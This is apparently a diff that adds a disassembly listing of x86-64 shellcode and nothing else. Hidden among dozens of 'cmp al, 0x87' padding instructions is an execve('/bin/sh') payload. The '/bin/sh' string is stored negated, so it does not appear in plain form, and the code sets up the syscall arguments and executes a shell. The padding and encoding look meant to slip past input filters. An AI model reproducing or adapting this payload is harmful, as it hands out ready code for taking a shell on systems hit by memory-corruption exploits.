@@ -1,0 +1,83 @@
+   0:   3c 87                   cmp    al, 0x87
+   2:   3c 87                   cmp    al, 0x87
+   4:   3c 87                   cmp    al, 0x87
+   6:   3c 87                   cmp    al, 0x87
+   8:   3c 87                   cmp    al, 0x87
+   a:   53                      push   rbx
+   b:   3c 87                   cmp    al, 0x87
+   d:   3c 87                   cmp    al, 0x87
+   f:   3c 87                   cmp    al, 0x87
+  11:   3c 87                   cmp    al, 0x87
+  13:   31 c0                   xor    eax, eax
+  15:   3c 0c                   cmp    al, 0xc
+  17:   48 bb d1 9d 96 91 d0 8c 97 ff   movabs rbx, 0xff978cd091969dd1
+  21:   3c 87                   cmp    al, 0x87
+  23:   48 f7 db                neg    rbx
+  26:   3c 87                   cmp    al, 0x87
+  28:   3c 87                   cmp    al, 0x87
+  2a:   3c 87                   cmp    al, 0x87
+  2c:   3c 87                   cmp    al, 0x87
+  2e:   53                      push   rbx
+  2f:   3c 87                   cmp    al, 0x87
+  31:   3c 87                   cmp    al, 0x87
+  33:   3c 87                   cmp    al, 0x87
+  35:   3c 87                   cmp    al, 0x87
+  37:   3c 87                   cmp    al, 0x87
+  39:   54                      push   rsp
+  3a:   3c 87                   cmp    al, 0x87
+  3c:   3c 87                   cmp    al, 0x87
+  3e:   3c 87                   cmp    al, 0x87
+  40:   3c 87                   cmp    al, 0x87
+  42:   3c 87                   cmp    al, 0x87
+  44:   5f                      pop    rdi
+  45:   3c 87                   cmp    al, 0x87
+  47:   3c 87                   cmp    al, 0x87
+  49:   3c 87                   cmp    al, 0x87
+  4b:   3c 87                   cmp    al, 0x87
+  4d:   3c 87                   cmp    al, 0x87
+  4f:   99                      cdq    
+  50:   3c 87                   cmp    al, 0x87
+  52:   3c 87                   cmp    al, 0x87
+  54:   3c 87                   cmp    al, 0x87
+  56:   3c 87                   cmp    al, 0x87
+  58:   3c 87                   cmp    al, 0x87
+  5a:   52                      push   rdx
+  5b:   3c 87                   cmp    al, 0x87
+  5d:   3c 87                   cmp    al, 0x87
+  5f:   3c 87                   cmp    al, 0x87
+  61:   3c 87                   cmp    al, 0x87
+  63:   3c 87                   cmp    al, 0x87
+  65:   57                      push   rdi
+  66:   3c 87                   cmp    al, 0x87
+  68:   3c 87                   cmp    al, 0x87
+  6a:   3c 87                   cmp    al, 0x87
+  6c:   3c 87                   cmp    al, 0x87
+  6e:   3c 87                   cmp    al, 0x87
+  70:   54                      push   rsp
+  71:   3c 87                   cmp    al, 0x87
+  73:   3c 87                   cmp    al, 0x87
+  75:   3c 87                   cmp    al, 0x87
+  77:   3c 87                   cmp    al, 0x87
+  79:   3c 87                   cmp    al, 0x87
+  7b:   5e                      pop    rsi
+  7c:   3c 87                   cmp    al, 0x87
+  7e:   3c 87                   cmp    al, 0x87
+  80:   3c 87                   cmp    al, 0x87
+  82:   3c 87                   cmp    al, 0x87
+  84:   3c 87                   cmp    al, 0x87
+  86:   b0 3b                   mov    al, 0x3b
+  88:   3c 87                   cmp    al, 0x87
+  8a:   3c 87                   cmp    al, 0x87
+  8c:   3c 87                   cmp    al, 0x87
+  8e:   3c 0c                   cmp    al, 0xc
+  90:   3c 87                   cmp    al, 0x87
+  92:   3c 87                   cmp    al, 0x87
+  94:   3c 87                   cmp    al, 0x87
+  96:   3c 87                   cmp    al, 0x87
+  98:   3c 87                   cmp    al, 0x87
+  9a:   3c 87                   cmp    al, 0x87
+  9c:   0f 05                   syscall 
+  9e:   3c 87                   cmp    al, 0x87
+  a0:   3c 87                   cmp    al, 0x87
+  a2:   3c 87                   cmp    al, 0x87
+  a4:   3c 0c                   cmp    al, 0xc
